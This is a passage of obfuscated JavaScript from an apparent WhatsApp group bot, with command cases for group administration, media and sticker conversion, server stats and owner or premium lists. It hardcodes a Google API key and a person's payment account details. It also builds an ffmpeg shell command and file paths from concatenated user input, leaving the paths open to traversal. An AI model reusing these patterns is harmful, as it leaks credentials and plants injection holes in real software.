        await _0x3dc8b7.groupParticipantsUpdate(_0x153ead.chat, [_0x5a8f52], 'add').then(_0x5d8923 => _0x244b45(json(_0x5d8923)))['catch'](_0x248560 => _0x244b45(json(_0x248560)));
        break;
      case "promote":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        let _0x59ea1d = _0x153ead.mentionedJid[0] ? _0x153ead.mentionedJid[0] : _0x153ead.quoted ? _0x153ead.quoted.sender : _0x570816.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x3dc8b7.groupParticipantsUpdate(_0x153ead.chat, [_0x59ea1d], "promote").then(_0x52b477 => _0x244b45(json(_0x52b477)))["catch"](_0x455b75 => _0x244b45(json(_0x455b75)));
        break;
      case 'demote':
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        let _0x43cbff = _0x153ead.mentionedJid[0] ? _0x153ead.mentionedJid[0] : _0x153ead.quoted ? _0x153ead.quoted.sender : _0x570816.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        await _0x3dc8b7.groupParticipantsUpdate(_0x153ead.chat, [_0x43cbff], "demote").then(_0x345fe7 => _0x244b45(json(_0x345fe7)))["catch"](_0x1030b8 => _0x244b45(json(_0x1030b8)));
        break;
      case 'setname':
      case "setsubject":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (!_0x570816) {
          return "Text ?";
        }
        await _0x3dc8b7.groupUpdateSubject(_0x153ead.chat, _0x570816).then(_0x41b9bc => _0x244b45(mess.success))['catch'](_0x3f3c41 => _0x244b45(json(_0x3f3c41)));
        break;
      case "setdesc":
      case "setdesk":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (!_0x570816) {
          return "Text ?";
        }
        await _0x3dc8b7.groupUpdateDescription(_0x153ead.chat, _0x570816).then(_0x590b50 => _0x244b45(mess.success))["catch"](_0x4331e8 => _0x244b45(json(_0x4331e8)));
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (!_0x1fa415) {
          return _0x244b45("Send/Reply Image With Caption " + (_0x1b9ee2 + _0x44cd63));
        }
        if (!/image/.test(_0x24c389)) {
          return _0x244b45("Send/Reply Image With Caption " + (_0x1b9ee2 + _0x44cd63));
        }
        if (/webp/.test(_0x24c389)) {
          return _0x244b45("Send/Reply Image With Caption " + (_0x1b9ee2 + _0x44cd63));
        }
        var _0x43ee83 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415, 'ppbot.jpeg');
        if (_0x2805cb[0] == "full") {
          var {
            img: _0x1cecae
          } = await generateProfilePicture(_0x43ee83);
          const _0xf3d4f = {
            to: _0x153ead.chat,
            type: "set",
            xmlns: "w:profile:picture"
          };
          const _0x1d97cf = {
            tag: "picture",
            attrs: {},
            content: _0x1cecae
          };
          _0x1d97cf.attrs.type = "image";
          const _0x4a2fe6 = {
            tag: 'iq',
            attrs: _0xf3d4f,
            content: [_0x1d97cf]
          };
          await _0x3dc8b7.query(_0x4a2fe6);
          fs.unlinkSync(_0x43ee83);
          _0x244b45(mess.done);
        } else {
          const _0x53f467 = {
            'url': _0x43ee83
          };
          var _0x2d247d = await _0x3dc8b7.updateProfilePicture(_0x153ead.chat, _0x53f467);
          fs.unlinkSync(_0x43ee83);
          _0x244b45(mess.done);
        }
        break;
      case "tagall":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49 && !_0x467c79) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99 && !_0x891b49 && !_0x467c79) {
          return _0x244b45(mess.botAdmin);
        }
        let _0x1c64d3 = "*👥 Tag All*\n \n                 🗞️ *Message : " + (q ? q : "blank") + "*\n\n";
        for (let _0x1c9213 of _0x5f3f58) {
          _0x1c64d3 += "• @" + _0x1c9213.id.split('@')[0] + "\n";
        }
        _0x3dc8b7.sendMessage(_0x153ead.chat, {
          'text': _0x1c64d3,
          'mentions': _0x5f3f58.map(_0x46e726 => _0x46e726.id)
        }, {
          'quoted': _0x153ead
        });
        break;
      case "hidetag":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49 && !_0x467c79) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99 && !_0x891b49 && !_0x467c79) {
          return _0x244b45(mess.botAdmin);
        }
        _0x3dc8b7.sendMessage(_0x153ead.chat, {
          'text': q ? q : '',
          'mentions': _0x5f3f58.map(_0x91f901 => _0x91f901.id)
        }, {
          'quoted': _0x153ead
        });
        break;
      case 'totag':
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x22fa99 && !_0x891b49 && !_0x467c79) {
          return _0x244b45(mess.botAdmin);
        }
        if (!_0x298734 && !_0x891b49 && !_0x467c79) {
          return _0x244b45(mess.admin);
        }
        if (!_0x153ead.quoted) {
          return _0x244b45("Reply messages with captions " + (_0x1b9ee2 + _0x44cd63));
        }
        _0x3dc8b7.sendMessage(_0x153ead.chat, {
          'forward': _0x153ead.quoted.fakeObj,
          'mentions': _0x5f3f58.map(_0x348ae6 => _0x348ae6.id)
        });
        break;
      case 'group':
      case 'grup':
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (_0x2805cb[0] === 'close') {
          await _0x3dc8b7.groupSettingUpdate(_0x153ead.chat, "announcement").then(_0x1635ad => _0x244b45("Success In Closing The Group 🕊️"))["catch"](_0x5c4792 => _0x244b45(json(_0x5c4792)));
        } else if (_0x2805cb[0] === "open") {
          await _0x3dc8b7.groupSettingUpdate(_0x153ead.chat, "not_announcement").then(_0x553c35 => _0x244b45("Success In Opening The Group 🕊️"))["catch"](_0xc47010 => _0x244b45(json(_0xc47010)));
        } else {
          _0x244b45("Mode " + _0x44cd63 + "\n\n\nType " + (_0x1b9ee2 + _0x44cd63) + "open/close");
        }
        break;
      case "editinfo":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        if (_0x2805cb[0] === "open") {
          await _0x3dc8b7.groupSettingUpdate(_0x153ead.chat, 'unlocked').then(_0x5dcf59 => _0x244b45("Successfully Opened Group Edit Info 🕊️"))["catch"](_0x2f4e30 => _0x244b45(json(_0x2f4e30)));
        } else if (_0x2805cb[0] === "close") {
          await _0x3dc8b7.groupSettingUpdate(_0x153ead.chat, "locked").then(_0x34a2a9 => _0x244b45("Successfully Closed Group Edit Info🕊️"))["catch"](_0xda4422 => _0x244b45(json(_0xda4422)));
        } else {
          _0x244b45("Mode " + _0x44cd63 + "\n\n\nType " + (_0x1b9ee2 + _0x44cd63) + "on/off");
        }
        break;
      case "linkgroup":
      case "grouplink":
      case "linkgrup":
      case "linkgc":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        let _0x32cc32 = await _0x3dc8b7.groupInviteCode(_0x153ead.chat);
        const _0x345b90 = {
          detectLink: true
        };
        _0x3dc8b7.sendText(_0x153ead.chat, "👥 *GROUP LINK INFO*\n📛 *Name :* " + _0x4b55e4.subject + "\n👤 *Group Owner :* " + (_0x4b55e4.owner !== undefined ? '@' + _0x4b55e4.owner.split`@`[0] : "Not known") + "\n🌱 *ID :* " + _0x4b55e4.id + "\n🔗 *Chat Link :* https://chat.whatsapp.com/" + _0x32cc32 + "\n👥 *Member :* " + _0x4b55e4.participants.length + "\n", _0x153ead, _0x345b90);
        break;
      case "revoke":
      case "resetlink":
        if (!_0x153ead.isGroup) {
          return _0x244b45(mess.group);
        }
        if (!_0x298734 && !_0x2bc87e && !_0x891b49) {
          return _0x244b45(mess.admin);
        }
        if (!_0x22fa99) {
          return _0x244b45(mess.botAdmin);
        }
        await _0x3dc8b7.groupRevokeInvite(_0x153ead.chat).then(_0x23d915 => {
          _0x244b45("Successful Reset, Group Invite Link " + _0x4b55e4.subject);
        })["catch"](_0x13efbb => _0x244b45(json(_0x13efbb)));
        break;
      case 'p':
      case "ping":
        {
          const _0x5e1a8f = process.memoryUsage();
          const _0x22947c = os.cpus().map(_0x320f9c => {
            _0x320f9c.total = Object.keys(_0x320f9c.times).reduce((_0x586092, _0x1b60f3) => _0x586092 + _0x320f9c.times[_0x1b60f3], 0);
            return _0x320f9c;
          });
          const _0x4b74f4 = {
            user: 0x0,
            nice: 0x0,
            sys: 0x0,
            idle: 0x0,
            irq: 0x0
          };
          const _0xaa460d = {
            speed: 0x0,
            total: 0x0,
            times: _0x4b74f4
          };
          const _0x5cb059 = _0x22947c.reduce((_0x4e5fbd, _0x4481d7, _0x54b3b4, {
            length: _0xa9cfda
          }) => {
            _0x4e5fbd.total += _0x4481d7.total;
            _0x4e5fbd.speed += _0x4481d7.speed / _0xa9cfda;
            _0x4e5fbd.times.user += _0x4481d7.times.user;
            _0x4e5fbd.times.nice += _0x4481d7.times.nice;
            _0x4e5fbd.times.sys += _0x4481d7.times.sys;
            _0x4e5fbd.times.idle += _0x4481d7.times.idle;
            _0x4e5fbd.times.irq += _0x4481d7.times.irq;
            return _0x4e5fbd;
          }, _0xaa460d);
          let _0x9c44a2 = speed();
          let _0x14807d = speed() - _0x9c44a2;
          neww = performance.now();
          oldd = performance.now();
          respon = ("\nResponse Speed " + _0x14807d.toFixed(4) + " _Second_ \n " + (oldd - neww) + " _miliseconds_\n\nRuntime : " + runtime(process.uptime()) + "\n\n💻 Info Server\nRAM: " + formatp(os.totalmem() - os.freemem()) + " / " + formatp(os.totalmem()) + "\n\n_NodeJS Memory Usaage_\n" + Object.keys(_0x5e1a8f).map((_0x100d3c, _0x201233, _0x4c8e63) => _0x100d3c.padEnd(Math.max(..._0x4c8e63.map(_0x1d5776 => _0x1d5776.length)), " ") + ": " + formatp(_0x5e1a8f[_0x100d3c])).join("\n") + "\n\n" + (_0x22947c[0] ? "_Total CPU Usage_\n" + _0x22947c[0].model.trim() + " (" + _0x5cb059.speed + " MHZ)\n" + Object.keys(_0x5cb059.times).map(_0x2cfb23 => "- *" + (_0x2cfb23 + '*').padEnd(6) + ": " + (100 * _0x5cb059.times[_0x2cfb23] / _0x5cb059.total).toFixed(2) + '%').join("\n") + "\n_CPU Core(s) Usage (" + _0x22947c.length + " Core CPU)_\n" + _0x22947c.map((_0xff7711, _0x6dd7d1) => _0x6dd7d1 + 1 + ". " + _0xff7711.model.trim() + " (" + _0xff7711.speed + " MHZ)\n" + Object.keys(_0xff7711.times).map(_0x2e7a8b => "- *" + (_0x2e7a8b + '*').padEnd(6) + ": " + (100 * _0xff7711.times[_0x2e7a8b] / _0xff7711.total).toFixed(2) + '%').join("\n")).join("\n\n") : '') + "\n").trim();
          await _0x3dc8b7.sendMessage(_0x153ead.chat, {
            'text': respon,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': '' + botname,
                'body': _0x14807d.toFixed(4) + " Second",
                'thumbnailUrl': "https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg",
                'sourceUrl': global.link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x153ead
          });
        }
        break;
      case 'buypremium':
      case "buyprem":
      case "premium":
        {
          let _0xaea41d = "Hi " + _0x5cd3c0 + "👋\nWant to Buy Premium? Just chat with the owner😉";
          const _0x20e357 = {
            showAdAttribution: true,
            title: '' + botname,
            body: '' + ownername,
            thumbnailUrl: "https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg",
            sourceUrl: global.link,
            mediaType: 0x1,
            renderLargerThumbnail: true
          };
          const _0x4b3f88 = {
            externalAdReply: _0x20e357
          };
          const _0x3ea5f6 = {
            text: _0xaea41d,
            contextInfo: _0x4b3f88
          };
          await _0x3dc8b7.sendMessage(_0x153ead.chat, _0x3ea5f6, {
            'quoted': _0x153ead
          });
        }
        break;
      case "runtime":
        let _0x295fc1 = "Bots Have Been Running For " + runtime(process.uptime());
        const _0x226a82 = {
          showAdAttribution: true,
          title: '' + botname,
          body: "FORGET DONATE",
          thumbnailUrl: "https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg",
          sourceUrl: global.link,
          mediaType: 0x1,
          renderLargerThumbnail: true
        };
        const _0x510a24 = {
          externalAdReply: _0x226a82
        };
        const _0xb2e85e = {
          text: _0x295fc1,
          contextInfo: _0x510a24
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0xb2e85e, {
          'quoted': _0x153ead
        });
        break;
      case 'sc':
      case "script":
      case 'scriptbot':
        const _0x13b88a = {
          showAdAttribution: true,
          title: '' + botname,
          body: "SCRIPT OF " + botname + " is on YouTube @JohnleoTech",
          thumbnailUrl: "https://i.ibb.co/dQkXV2Y/Picsart-23-10-10-18-28-51-982.jpg",
          sourceUrl: global.link,
          mediaType: 0x1,
          renderLargerThumbnail: true
        };
        const _0x3a164e = {
          externalAdReply: _0x13b88a
        };
        const _0x1852cb = {
          text: "Helllo world",
          contextInfo: _0x3a164e
        };
        _0x3dc8b7.sendMessage(_0x153ead.chat, _0x1852cb, {
          'quoted': _0x153ead
        });
        break;
      case 'donate':
      case 'donasi':
        let _0x5d162d = "Hello Brother " + _0x5cd3c0 + "\n\nNo matter how much you donate is very valuable for us";
        _0x3dc8b7.sendMessage(_0x153ead.chat, {
          'text': "Opay: 6113921262 Opay, Udo ifechukwu John \n\n" + _0x5d162d
        }, {
          'quoted': _0x153ead
        });
        break;
      case "owner":
        {
          const _0x563740 = {
            displayName: _0x46f814.length + " Contact",
            contacts: _0x46f814
          };
          const _0x4b95b0 = {
            contacts: _0x563740,
            mentions: [_0x544b4]
          };
          const _0x3d28a4 = {
            quoted: _0x153ead
          };
          const _0x3fca92 = await _0x3dc8b7.sendMessage(_0x22825f, _0x4b95b0, _0x3d28a4);
          const _0x38359c = {
            quoted: _0x3fca92
          };
          _0x3dc8b7.sendMessage(_0x22825f, {
            'text': "Hi @" + _0x544b4.split('@')[0] + ", Here is my handsome owner😇",
            'mentions': [_0x544b4]
          }, _0x38359c);
        }
        break;
      case "sticker":
      case "stiker":
      case 's':
        {
          if (!_0x1fa415) {
            return _0x244b45("Reply to Video/Image With Caption " + (_0x1b9ee2 + _0x44cd63));
          }
          if (/image/.test(_0x24c389)) {
            let _0xb1e95f = await _0x1fa415.download();
            const _0x5c5f7a = {
              packname: packname,
              author: author
            };
            let _0x192047 = await _0x3dc8b7.sendImageAsSticker(_0x153ead.chat, _0xb1e95f, _0x153ead, _0x5c5f7a);
            await fs.unlinkSync(_0x192047);
          } else {
            if (_0x722214 || /video/.test(_0x24c389)) {
              if ((_0x1fa415.msg || _0x1fa415).seconds > 11) {
                return _0x244b45("Maximum 10 seconds!");
              }
              let _0x57f8b5 = await _0x1fa415.download();
              const _0x1b8d3a = {
                packname: packname,
                author: author
              };
              let _0x4208a1 = await _0x3dc8b7.sendVideoAsSticker(_0x153ead.chat, _0x57f8b5, _0x153ead, _0x1b8d3a);
              await fs.unlinkSync(_0x4208a1);
            } else {
              return _0x244b45("Send Images/Videos With Captions " + (_0x1b9ee2 + _0x44cd63) + "\nVideo Duration 1-9 Seconds");
            }
          }
        }
        break;
      case "smeme":
        {
          let _0x1d6b31 = "Send/Reply image/sticker with caption " + (_0x1b9ee2 + _0x44cd63) + " text1|text2";
          if (!/image/.test(_0x24c389)) {
            return _0x244b45(_0x1d6b31);
          }
          if (!_0x570816) {
            return _0x244b45(_0x1d6b31);
          }
          _0x244b45(mess.wait);
          atas = _0x570816.split('|')[0] ? _0x570816.split('|')[0] : '-';
          bawah = _0x570816.split('|')[1] ? _0x570816.split('|')[1] : '-';
          let _0x30634c = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x2cf4a3);
          let _0x417fbf = await TelegraPh(_0x30634c);
          let _0x451ecf = "https://api.memegen.link/images/custom/" + encodeURIComponent(bawah) + '/' + encodeURIComponent(atas) + ".png?background=" + _0x417fbf;
          const _0x87d1c3 = {
            packname: packname,
            author: author
          };
          let _0x1a8ecb = await _0x3dc8b7.sendImageAsSticker(_0x153ead.chat, _0x451ecf, _0x153ead, _0x87d1c3);
          fs.unlinkSync(_0x1a8ecb);
        }
        break;
      case 'swm':
      case 'steal':
      case "stickerwm":
      case "take":
        {
          if (!_0x2805cb.join(" ")) {
            return _0x244b45("Where is the text?");
          }
          if (_0x153ead.quoted.isAnimated === true) {
            _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415, "gifee");
            const _0x4a63cd = {
              quoted: _0x153ead
            };
            _0x3dc8b7.sendMessage(_0x22825f, {
              'sticker': fs.readFileSync("gifee.webp")
            }, _0x4a63cd);
          } else {
            if (/image/.test(_0x24c389)) {} else {
              if (/video/.test(_0x24c389)) {
                if ((_0x1fa415.msg || _0x1fa415).seconds > 11) {
                  return _0x244b45("Maximum 10 Seconds!");
                }
              } else {
                _0x244b45("Photo/Video?");
              }
            }
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!/webp/.test(_0x24c389)) {
            return _0x244b45("Reply sticker with caption *" + (_0x1b9ee2 + _0x44cd63) + '*');
          }
          _0x244b45(mess.wait);
          let _0x5d9b53 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x2cf4a3);
          let _0x5c8f2a = await getRandom(".png");
          exec("ffmpeg -i " + _0x5d9b53 + " " + _0x5c8f2a, _0x2093dc => {
            fs.unlinkSync(_0x5d9b53);
            if (_0x2093dc) {
              return _0x2093dc;
            }
            let _0x530ea7 = fs.readFileSync(_0x5c8f2a);
            const _0x4a3ea7 = {
              image: _0x530ea7
            };
            _0x3dc8b7.sendMessage(_0x153ead.chat, _0x4a3ea7, {
              'quoted': _0x153ead
            });
            fs.unlinkSync(_0x5c8f2a);
          });
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!/webp/.test(_0x24c389)) {
            return _0x244b45("Reply sticker with caption *" + (_0x1b9ee2 + _0x44cd63) + '*');
          }
          _0x244b45(mess.wait);
          let _0x2e2682 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x2cf4a3);
          let _0x1c6ee0 = await webp2mp4File(_0x2e2682);
          const _0x3447db = {
            url: _0x1c6ee0.result,
            caption: "Convert Webp To Video"
          };
          const _0x15d381 = {
            video: _0x3447db
          };
          await _0x3dc8b7.sendMessage(_0x153ead.chat, _0x15d381, {
            'quoted': _0x153ead
          });
          await fs.unlinkSync(_0x2e2682);
        }
        break;
      case "toaud":
      case 'toaudio':
        {
          if (!/video/.test(_0x24c389) && !/audio/.test(_0x24c389)) {
            return _0x244b45("Send/Reply Video/Audio that you want to make into audio with caption " + (_0x1b9ee2 + _0x44cd63));
          }
          _0x244b45(mess.wait);
          let _0x277141 = await _0x3dc8b7.downloadMediaMessage(_0x2cf4a3);
          let _0x40fbfd = await toAudio(_0x277141, 'mp4');
          const _0x83a8ba = {
            audio: _0x40fbfd,
            mimetype: "audio/mpeg"
          };
          _0x3dc8b7.sendMessage(_0x153ead.chat, _0x83a8ba, {
            'quoted': _0x153ead
          });
        }
        break;
      case 'tomp3':
        {
          if (!/video/.test(_0x24c389) && !/audio/.test(_0x24c389)) {
            return _0x244b45("Send/Reply Video/Audio that you want to make into MP3 with caption " + (_0x1b9ee2 + _0x44cd63));
          }
          _0x244b45(mess.wait);
          let _0xe9bbd6 = await _0x3dc8b7.downloadMediaMessage(_0x2cf4a3);
          let _0x4648ef = await toAudio(_0xe9bbd6, 'mp4');
          const _0x5b3eba = {
            document: _0x4648ef,
            mimetype: "audio/mp3",
            fileName: 'dgxeon.mp3'
          };
          _0x3dc8b7.sendMessage(_0x153ead.chat, _0x5b3eba, {
            'quoted': _0x153ead
          });
        }
        break;
      case 'tovn':
      case 'toptt':
        {
          if (!/video/.test(_0x24c389) && !/audio/.test(_0x24c389)) {
            return _0x244b45("Reply Video/Audio that you want to make into a VN with caption " + (_0x1b9ee2 + _0x44cd63));
          }
          _0x244b45(mess.wait);
          let _0x405583 = await _0x3dc8b7.downloadMediaMessage(_0x2cf4a3);
          let {
            toPTT: _0x11e40f
          } = require("./lib/converter");
          let _0x4836d8 = await _0x11e40f(_0x405583, 'mp4');
          const _0x213cd9 = {
            audio: _0x4836d8,
            mimetype: "audio/mpeg",
            ptt: true
          };
          _0x3dc8b7.sendMessage(_0x153ead.chat, _0x213cd9, {
            'quoted': _0x153ead
          });
        }
        break;
      case "togif":
        {
          if (!/webp/.test(_0x24c389)) {
            return _0x244b45("Reply sticker with caption *" + (_0x1b9ee2 + _0x44cd63) + '*');
          }
          _0x244b45(mess.wait);
          let _0x58acbd = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x2cf4a3);
          let _0x2d4b4e = await webp2mp4File(_0x58acbd);
          const _0x106457 = {
            url: _0x2d4b4e.result,
            caption: "Convert Webp To Video"
          };
          const _0x2d813a = {
            video: _0x106457,
            gifPlayback: true
          };
          await _0x3dc8b7.sendMessage(_0x153ead.chat, _0x2d813a, {
            'quoted': _0x153ead
          });
          await fs.unlinkSync(_0x58acbd);
        }
        break;
      case "tourl":
        {
          _0x244b45(mess.wait);
          let _0x1777f9 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x2cf4a3);
          if (/image/.test(_0x24c389)) {
            let _0x31f3d6 = await TelegraPh(_0x1777f9);
            _0x244b45(util.format(_0x31f3d6));
          } else {
            if (!/image/.test(_0x24c389)) {
              let _0x2a1f30 = await UploadFileUgu(_0x1777f9);
              _0x244b45(util.format(_0x2a1f30));
            }
          }
          await fs.unlinkSync(_0x1777f9);
        }
        break;
      case "emojimix":
        {
          let [_0x2c000d, _0x150442] = _0x570816.split`+`;
          if (!_0x2c000d) {
            return _0x244b45("Example : " + (_0x1b9ee2 + _0x44cd63) + " 😅+🤔");
          }
          if (!_0x150442) {
            return _0x244b45("Example : " + (_0x1b9ee2 + _0x44cd63) + " 😅+🤔");
          }
          _0x244b45(mess.wait);
          let _0x5676a0 = await fetchJson("https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=" + encodeURIComponent(_0x2c000d) + '_' + encodeURIComponent(_0x150442));
          for (let _0x4a6f15 of _0x5676a0.results) {
            let _0x244a38 = await _0x3dc8b7.sendImageAsSticker(_0x153ead.chat, _0x4a6f15.url, _0x153ead, {
              'packname': global.packname,
              'author': global.author,
              'categories': _0x4a6f15.tags
            });
            await fs.unlinkSync(_0x244a38);
          }
        }
        break;
      case "toonce":
      case "toviewonce":
        {
          if (!_0x1fa415) {
            return _0x244b45("Reply Image/Video");
          }
          if (/image/.test(_0x24c389)) {
            anuan = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
            const _0x1bfa10 = {
              'url': anuan
            };
            const _0x177a29 = {
              image: _0x1bfa10,
              caption: "Here you go!",
              fileLength: "999",
              viewOnce: true
            };
            _0x3dc8b7.sendMessage(_0x153ead.chat, _0x177a29, {
              'quoted': _0x153ead
            });
          } else {
            if (/video/.test(_0x24c389)) {
              anuanuan = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
              const _0x2c3c1c = {
                url: anuanuan
              };
              const _0x400640 = {
                video: _0x2c3c1c,
                caption: "Here you go!",
                fileLength: "99999999",
                viewOnce: true
              };
              _0x3dc8b7.sendMessage(_0x153ead.chat, _0x400640, {
                'quoted': _0x153ead
              });
            }
          }
        }
        break;
      case "toqr":
        {
          if (!q) {
            return _0x244b45(" Please include link or text!");
          }
          const _0x2acb6e = require("qrcode");
          const _0x14202a = {
            'scale': 0x23
          };
          let _0x36fb2a = await _0x2acb6e.toDataURL(q, _0x14202a);
          let _0x4c238d = new Buffer.from(_0x36fb2a.replace("data:image/png;base64,", ''), "base64");
          let _0x590b41 = getRandom(".jpg");
          await fs.writeFileSync('./' + _0x590b41, _0x4c238d);
          let _0x4fe02d = fs.readFileSync('./' + _0x590b41);
          const _0x8ec37b = {
            image: _0x4fe02d,
            caption: "Here you go!"
          };
          const _0x51a0ea = {
            quoted: _0x153ead
          };
          await _0x3dc8b7.sendMessage(_0x22825f, _0x8ec37b, _0x51a0ea);
          setTimeout(() => {
            fs.unlinkSync(_0x590b41);
          }, 10000);
        }
        break;
      case "fliptext":
        {
          if (_0x2805cb.length < 1) {
            return _0x244b45("Example:\n" + _0x1b9ee2 + "fliptext Xeony");
          }
          quere = _0x2805cb.join(" ");
          flipe = quere.split('').reverse().join('');
          _0x244b45("```「 FLIP TEXT 」```\n*•> Normal :*\n" + quere + "\n*•> Flip :*\n" + flipe);
        }
        break;
      case "listvn":
        {
          let _0x141db6 = "┌──⭓「 *List Vn* 」\n│\n";
          for (let _0x5c9d22 of VoiceNoteXeon) {
            _0x141db6 += "│⭔ " + _0x5c9d22 + "\n";
          }
          _0x141db6 += "│\n└────────────⭓\n\n*Total : " + VoiceNoteXeon.length + '*';
          _0x244b45(_0x141db6);
        }
        break;
      case "liststicker":
        {
          let _0x332032 = "┌──⭓「 *List Sticker* 」\n│\n";
          for (let _0x21ca36 of StickerXeon) {
            _0x332032 += "│⭔ " + _0x21ca36 + "\n";
          }
          _0x332032 += "│\n└────────────⭓\n\n*Total : " + StickerXeon.length + '*';
          _0x244b45(_0x332032);
        }
        break;
      case 'listimage':
        {
          let _0x421d9b = "┌──⭓「 *List Image* 」\n│\n";
          for (let _0x5cfd7f of ImageXeon) {
            _0x421d9b += "│⭔ " + _0x5cfd7f + "\n";
          }
          _0x421d9b += "│\n└────────────⭓\n\n*Total : " + ImageXeon.length + '*';
          _0x244b45(_0x421d9b);
        }
        break;
      case 'listvideo':
        {
          let _0x3f08bd = "┌──⭓「 *List Video* 」\n│\n";
          for (let _0x2ac4c0 of VideoXeon) {
            _0x3f08bd += "│⭔ " + _0x2ac4c0 + "\n";
          }
          _0x3f08bd += "│\n└────────────⭓\n\n*Total : " + VideoXeon.length + '*';
          _0x244b45(_0x3f08bd);
        }
        break;
      case "addowner":
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (!_0x2805cb[0]) {
          return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " number\nExample " + (_0x1b9ee2 + _0x44cd63) + " " + ownernumber);
        }
        bnnd = q.split('|')[0].replace(/[^0-9]/g, '');
        let _0x572b83 = await _0x3dc8b7.onWhatsApp(bnnd);
        if (_0x572b83.length == 0) {
          return _0x244b45("Enter A Valid And Registered Number On WhatsApp!!!");
        }
        owner.push(bnnd);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        _0x244b45("Number " + bnnd + " Has Become An Owner!!!");
        break;
      case 'delowner':
        if (!_0x891b49) {
          return _0x244b45(mess.owner);
        }
        if (!_0x2805cb[0]) {
          return _0x244b45("Use " + (_0x1b9ee2 + _0x44cd63) + " nomor\nExample " + (_0x1b9ee2 + _0x44cd63) + " 2348027387246");
        }
        ya = q.split('|')[0].replace(/[^0-9]/g, '');
        unp = owner.indexOf(ya);
        owner.splice(unp, 1);
        fs.writeFileSync("./database/owner.json", JSON.stringify(owner));
        _0x244b45("The Number " + ya + " Has been deleted from owner list by the owner!!!");
        break;
      case "addvideo":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Video Name?");
          }
          if (VideoXeon.includes(q)) {
            return _0x244b45("The name you entered already exists");
          }
          let _0x1fe5b3 = await _0x3dc8b7.downloadAndSaveMediaMessage(_0x1fa415);
          VideoXeon.push(q);
          await fsx.copy(_0x1fe5b3, "./XeonMedia/video/" + q + ".mp4");
          fs.writeFileSync("./database/autoreply/video.json", JSON.stringify(VideoXeon));
          fs.unlinkSync(_0x1fe5b3);
          _0x244b45("Success Adding VideoTo View Type " + _0x1b9ee2 + "listvideo");
        }
        break;
      case "delvideo":
        {
          if (!_0x467c79) {
            return _0x244b45(mess.prem);
          }
          if (_0x2805cb.length < 1) {
            return _0x244b45("Enter the Video Name");
          }
          if (!VideoXeon.includes(q)) {
            return _0x244b45("Name Does Not Exist in Database");
          }
          let _0x564d13 = VideoXeon.indexOf(q);
          VideoXeon.splice(_0x564d13, 1);
          fs.writeFileSync("./database/autoreply/video.json", JSON.stringify(VideoXeon));
          fs.unlinkSync("./XeonMedia/video/" + q + ".mp4");
          _0x244b45("Successfully Deleted Video " + q);
        }
        break;
      case 'addimage':
        {
